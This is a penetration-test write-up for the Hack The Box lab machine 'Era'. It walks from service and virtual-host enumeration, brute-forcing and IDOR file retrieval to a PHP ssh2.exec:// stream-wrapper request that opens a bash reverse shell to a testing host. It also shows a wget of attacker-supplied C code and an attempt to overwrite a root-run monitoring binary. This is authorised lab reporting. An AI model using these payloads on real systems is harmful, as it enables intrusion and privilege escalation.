
| Field                  | Details                       |
| ---------------------- | ----------------------------- |
| Assessment Type        | Internal Penetration Testing  |
| Target                 | Era — Part of the CWES Track  |
| Target IP              | <SNIP\>                       |
| Operating System       | Linux                         |
| Difficulty             | Medium                        |
| Assessment Date        | 19/10/2026                    |
| Assessment Environment | Hack The Box — Authorised Lab |
| Author                 | matw0                         |

---
## Executive Summary



---

## 2. Evidence — Technical Walkthrough

### 2.1 Initial Reconnaissance and Service Discovery

I began by scanning the target to identify the exposed services and their versions:

```bash
nmap -sV -sC -T4 -oA test1 10.129.237.233
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)

http-title: Did not follow redirect to http://era.htb/
```

**Observation:** The host exposed FTP and HTTP. The HTTP service redirected to `era.htb`, which indicated that the hostname was important for virtual-host routing. I added the hostname to my local `/etc/hosts` configuration before continuing.

I reviewed the public website and inspected its HTML. The page appeared primarily informational; the contact form was visible, but I did not observe a useful application request being submitted from it during interception.

![E01 — Public contact form on era.htb](./evidence/Pasted%20image%2020261020142601.png)

*Figure E01 — The public-facing contact form on `era.htb`. Its presence alone does not establish a vulnerability.*

### 2.2 Virtual Host and Directory Enumeration

While browsing, I used `ffuf` to look for other virtual hosts by modifying the HTTP `Host` header:

```bash
ffuf -u http://era.htb \
  -H "Host: FUZZ.era.htb" \
  -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \
  -fs 154
```

```text
file [Status: 200, Size: 6765, Words: 2608, Lines: 234]
```

**Observation:** This revealed `file.era.htb`. I added that hostname to `/etc/hosts` and prioritised it because it exposed interactive file-management and authentication functionality.

I also tested directory enumeration on the original `era.htb` website. The relevant results were static asset directories:

```text
img    [Status: 301]
css    [Status: 301]
js     [Status: 301]
fonts  [Status: 301]
```

The scan was interrupted because it was returning large amounts of low-value output. These results did not establish an exploitable weakness on the original site.

![E02 — File-management application at file.era.htb](./evidence/Pasted%20image%2020261020143001.png)

*Figure E02 — `file.era.htb` offered Manage Files, Upload Files, Update Security Questions and Sign In, providing a more substantial attack surface.*

I then enumerated PHP endpoints on the file-management virtual host:

```bash
ffuf -u http://file.era.htb/FUZZ \
  -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -recursion-depth=4 -recursion-strategy=greedy \
  -fs 6765 -e .php,.html,.phtml
```

```text
login.php       [Status: 200]
register.php    [Status: 200]
logout.php      [Status: 200]
layout.php      [Status: 200]
download.php    [Status: 302]
upload.php      [Status: 302]
manage.php      [Status: 302]
reset.php       [Status: 302]
LICENSE         [Status: 200]
```

**Analysis:** The HTTP 302 responses for several functions suggested that unauthenticated requests were being redirected. I therefore focused on the sign-in flow, security-question login and account registration.

### 2.3 Login and Security-Question Testing

The application offered an alternative way to log in by answering three security questions.

![E03 — Intercepted POST request to security_login.php](./evidence/Pasted%20image%2020261020145221.png)

*Figure E03 — Burp Suite shows a `POST /security_login.php` request with a test username and three submitted answers. The response contains the message `User not found.`*

![E04 — Security-question login form](./evidence/Pasted%20image%2020261020145352.png)

*Figure E04 — The security-question login interface requests a username and answers to three account-recovery questions.*

I compared how the application responded to requests through this form and observed that the `POST` response disclosed whether a supplied username existed through a distinguishable error message. This was worth investigating for username enumeration.

I also tested the normal `login.php` endpoint.

![E05 — Generic sign-in failure message](./evidence/Pasted%20image%2020261020145540.png)

*Figure E05 — The regular sign-in page returned `Invalid username or password`. This generic message alone did not provide the same explicit username-not-found distinction.*

I attempted a SQL injection check against a saved login request:

```bash
sqlmap -r login1.req --level=5 --risk=3 --technique=B --dump --batch
```

```text
[WARNING] (custom) POST parameter '#1*' does not seem to be injectable
[CRITICAL] all tested parameters do not appear to be injectable
```

**Result:** No SQL injection was confirmed by this test. Because the test was restricted to a particular technique and request, it should not be described as proof that the application is entirely free from SQL injection.

### 2.4 Username Enumeration and Unsuccessful Credential Testing

I used OWASP ZAP's fuzzer to submit candidate usernames and compare responses for the security-question authentication flow.

![E06 — ZAP fuzzing results for candidate usernames](./evidence/Pasted%20image%2020261020151229.png)

*Figure E06 — ZAP shows the automated request/response testing environment used to compare authentication responses. The screenshot alone is not sufficient to establish which individual usernames were valid.*

![E07 — ZAP candidate username results](./evidence/Pasted%20image%2020261020154159.png)

*Figure E07 — The fuzzer result list includes candidate usernames such as `eric`, `veronica` and `yuri`. A response-level comparison is needed to document which were reliably distinguished from nonexistent accounts.*

I also tried a password wordlist against the standard sign-in endpoint:

```bash
ffuf -u http://file.era.htb/login.php \
  -X POST \
  -d 'submitted=true&username=john&password=FUZZ' \
  -w /usr/share/wordlists/rockyou.txt \
  -fs 9214
```

```text
maxim [Status: 200, Size: 0, Words: 1, Lines: 1]
```

**Result:** The output was not enough, by itself, to demonstrate a successful login. The zero-length response was an interesting deviation that would need a follow-up authenticated request or valid session to confirm its meaning.

I stopped further brute-force testing and returned to manual application enumeration. The fact that the database later contained bcrypt hashes does **not** mean the web login should have received hashed passwords: web logins commonly accept plaintext over the protected transport and compare it against a stored hash on the server.

### 2.5 Authenticated Application Access and Account-Recovery Functionality

I registered a test account and authenticated to access the application features that had previously redirected to login.

![E08 — Authenticated file-management and account settings page](./evidence/Pasted%20image%2020261020160204.png)

*Figure E08 — The Manage Files & Settings page provides file-management functionality and a Reset Security Questions option.*

During testing, I also used `reset.php` to change answers associated with usernames discovered during enumeration, according to my working notes.

**Evidence limitation:** The supplied screenshots do not contain the exact `reset.php` request, affected username, response or successful account takeover. This action should be corroborated with the saved Burp/ZAP request and its response before making a formal claim about unauthorised security-question changes.

### 2.6 File Identifier Enumeration and Access to Archived Files

The file-management workflow used integer identifiers in requests to `download.php`. I tested whether other identifiers returned different responses.

```bash
ffuf -w <(seq 1 1000) \
  -u 'http://file.era.htb/download.php?id=FUZZ' \
  -b 'PHPSESSID=[REDACTED]' \
  -fw 3161
```

```text
54  [Status: 200, Size: 6378, Words: 2552, Lines: 222]
150 [Status: 200, Size: 6366, Words: 2552, Lines: 222]
```

**Observation:** The two responses were candidates for further inspection, rather than proof of unauthorised disclosure based on response size alone. My recorded testing subsequently retrieved files identified as `site-backup-30-08-24.zip` and `signing.zip`.

**Missing image:** The original report referenced `Pasted image 20261020162653.png` at this point, but that file was not present in the uploaded ZIP. I have not inserted a broken image link. Re-add it later if it shows the upload/download interface or the file identifier.

### 2.7 Inspection of `signing.zip` and the SQLite Application Backup

The recovered `signing.zip` archive included a private key/certificate bundle and an `x509.genkey` configuration. I reviewed the configuration instead of reproducing the full private key in the report:

```ini
[ req ]
default_bits = 2048
distinguished_name = req_distinguished_name
x509_extensions = myexts

[ req_distinguished_name ]
O = Era Inc.
CN = ELF verification
emailAddress = yurivich@era.com

[ myexts ]
basicConstraints=critical,CA:FALSE
keyUsage=digitalSignature
```

**Observation:** This material was associated with ELF signing/verification. It may be relevant to the monitoring process investigated later. Its presence does not establish that this key was used for SSH authentication.

The other archive contained an application database called `filedb.sqlite`. I inspected it using the SQLite command-line client:

```bash
sqlite3 filedb.sqlite
```

```sql
.tables
SELECT * FROM users;
.schema
SELECT * FROM files;
```

Relevant results:

```text
Tables:
  files
  users

Usernames found:
  admin_ef01cab31aa
  eric
  veronica
  yuri
  john
  ethan

Password representations:
  $2y$10$...  (bcrypt)
  $2b$12$...  (bcrypt)
  $2a$10$...  (bcrypt)

Files table snapshot:
  54 | files/site-backup-30-08-24.zip | 1 | 1725044282
```

The schema confirmed that the `users` table contained a username, password hash, file-retention setting and three security-question answer fields. The `files` table recorded file identifiers, paths, owners and timestamps.

**Important distinction:** The backup database is a snapshot, while the earlier `ffuf` requests queried a live service. Therefore, a single row in this backup's `files` table does not disprove the separate live response for ID `150`, and it does not prove that no additional files existed on the server.

Offline hash analysis recovered credentials for two users in the laboratory:

```text
eric → [REDACTED]
yuri → [REDACTED]
```

This established that passwords could be recovered from the exposed hashes in this instance. It does not mean bcrypt itself was broken: recoverability depends on password choice and the resources and wordlist used.

### 2.8 Source-Code Review: Admin-Only File Preview and PHP Wrappers

I searched the extracted source code for references to administrative behaviour:

```bash
grep -rin "admin" *.php
```

```text
download.php:58: // BETA (Currently only available to the admin) - Showcase file instead of downloading it
functions.global.php:13: // example query for admin-owned files
upload.php:222: // administrators may change php.ini upload limits
```

Further inspection of `download.php` revealed an administrative file-preview function. The following extract is central to understanding the issue:

```php
} elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
    $format = isset($_GET['format']) ? $_GET['format'] : '';
    $file = $fetched[0];

    if (strpos($format, '://') !== false) {
        $wrapper = $format;
        header('Content-Type: application/octet-stream');
    } else {
        $wrapper = '';
        header('Content-Type: text/html');
    }

    try {
        $file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
        $full_path = $wrapper ? $wrapper . $file : $file;
        echo "Opening: " . $full_path . "\n";
        echo $file_content;
    } catch (Exception $e) {
        echo "Error reading file: " . $e->getMessage();
    }
}
```

**What this means:**

- `show=true` invokes the preview branch when the session corresponds to `erauser === 1`; the underlying access requirement is therefore a key part of the attack path.
- `$format` comes from the URL query string.
- The code checks whether the supplied value contains `://`, but it does not show an allowlist restricting which PHP stream wrappers are permitted.
- `fopen()` then receives a path built from the supplied wrapper and the stored file path.

PHP stream wrappers give filesystem functions a way to access resources through schemes such as `file://` and, if the relevant extension is installed, `ssh2.exec://`. In this case the risk is not the existence of wrappers by itself, but allowing user-influenced wrapper syntax to reach `fopen()`.

The recorded request in the next section demonstrates that this was more than a theoretical source-code concern.

### 2.9 FTP Enumeration and Availability of the SSH2 Extension

Using the recovered `yuri` credentials, I successfully authenticated to the FTP service identified by the initial Nmap scan:

```text
ftp era.htb
Name: yuri
Password: [REDACTED]
230 Login successful.
```

The FTP directory listing included PHP 8.1 extension files under `php8.1_conf/`, including:

```text
ssh2.so
```

**Observation:** The presence of `ssh2.so` was relevant because the source code used `fopen()` with a selectable wrapper. The listing alone does not prove the extension was loaded in the web process; the subsequent result provides the stronger behavioural evidence.

### 2.10 PHP Stream-Wrapper Execution and Initial Shell

My notes record a crafted request to the file-preview functionality, using the `ssh2.exec://` scheme with the recovered `eric` credentials and an authenticated web session.

```http
GET /download.php?id=54&show=true&format=ssh2.exec://eric:[REDACTED]@localhost:22/bash+-c+"bash+-i+>%26+/dev/tcp/10.10.15.197/4445+0>%261"%23 HTTP/1.1
Host: file.era.htb
Cookie: PHPSESSID=[REDACTED]
```

**Analysis:** The `ssh2.exec://` stream-wrapper syntax represents an SSH-backed command execution operation rather than an ordinary file-format selector. Here, the application combined attacker-influenced wrapper input with a file-reading function. The recorded request leveraged credentials recovered earlier in the assessment. The trailing encoded `#` was part of the tested URI string; its precise effect on the appended file path should be explained from the resulting request behaviour rather than assumed.

A listener on the testing machine received a connection:

```text
listening on [any] 4445 ...
connect to [10.10.15.197] from (UNKNOWN) [10.129.237.233] ...
eric@era:~$
```

Local enumeration showed the shell was operating as `eric`. The user-level HTB proof file was also accessed, but its contents are intentionally excluded from the public report.

**Result:** An interactive shell as `eric` was obtained. This is the confirmed initial host foothold shown by the supplied terminal output.

### 2.11 Local Enumeration: Root Cron Job and Monitoring Binary

After obtaining the user shell, I investigated recurring processes to identify services executing with higher privileges. The process-monitoring output contained repeated root-owned cron executions:

```text
UID=0 | /usr/sbin/CRON -f -P
UID=0 | bash -c /root/initiate_monitoring.sh
UID=0 | /opt/AV/periodic-checks/monitor
UID=0 | openssl asn1parse -inform DER -in text_sig_section.bin
```

**Observation:** The root-run script periodically interacted with a custom monitoring executable and appeared to inspect signed binary content. This made the monitoring directory a relevant place to investigate.

The directory permissions were:

```text
eric@era:/opt/AV/periodic-checks$ ls -la

drwxrwxr-- 2 root devs  4096 ... .
-rwxrw---- 1 root devs 16544 ... monitor
-rw-rw---- 1 root devs   307 ... status.log
```

The `monitor` file was writable by its owner and group, and a later `cp` command in my notes succeeded. The evidence therefore supports that this session could modify the monitoring executable; the specific group-membership check (for example, output of `id`) was not included.

### 2.12 Monitoring Binary Replacement: First Attempt and Final Result

I transferred a small C source file to the machine, compiled it and copied the resulting executable over the monitored binary:

```bash
wget http://10.10.15.197:85/shell.c
gcc shell.c -o shell
cp shell monitor
cat status.log
```

The log recorded an unsuccessful integrity check:

```text
objcopy: /opt/AV/periodic-checks/monitor: can't dump section '.text_sig'
[ERROR] Executable not signed. Tampering attempt detected. Skipping.
```

**Result of this attempt:** The root-owned monitoring workflow rejected the substituted executable because the expected `.text_sig` section was not present or could not be extracted. This failed test is important evidence: simply replacing `monitor` was not sufficient.

![E09 — Later shell running as root](./evidence/Pasted%20image%2020261020184653.png)

*Figure E09 — A later terminal screenshot shows a shell prompt as `root@era` and access to root-protected content. The HTB proof value is not reproduced in the report text.*

**Evidence gap:** The supplied notes jump from the failed signature validation to the later root shell. They do not include the intermediate steps that satisfied or bypassed the executable-signature check. Before writing the formal privilege-escalation finding, recover that missing transition from your shell history, notes or additional evidence. The final screenshot confirms the resulting access level, but it does not independently document the full method used.

---
## Vulnerability Findings
| ID  | Finding                                                | Severity | CVSS v3.1 | CWE                                             |
| --- | ------------------------------------------------------ | -------- | --------- | ----------------------------------------------- |
| F01 | Username Enumeration via Authentication Responses      | Medium   | 5.3       | https://cwe.mitre.org/data/definitions/204.html |
| F02 | Improper Authorisation in Security Question Management |          |           |                                                 |
| F03 | Insecure Direct Object Reference in File Downloads     |          |           |                                                 |
| F04 | Unsafe PHP Stream Wrapper Handling                     |          |           |                                                 |
| F05 | Privilege Escalation via Privileged Scheduled Task     |          |           |                                                 |